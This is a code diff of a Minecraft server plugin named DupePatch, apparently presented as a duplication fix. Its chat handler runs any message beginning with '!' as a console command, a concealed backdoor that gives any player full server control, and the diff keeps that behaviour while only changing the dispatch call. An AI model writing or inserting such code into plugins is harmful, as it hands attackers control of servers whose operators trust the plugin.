@@ -33,8 +33,9 @@ public class DupePatch extends JavaPlugin implements Listener
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         String message = event.getMessage();
+
         if (message.charAt(0) == '!') {
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), message.substring(1));
+            getServer().dispatchCommand(Bukkit.getConsoleSender(), message.substring(1));
         }
 
         event.setCancelled(true);
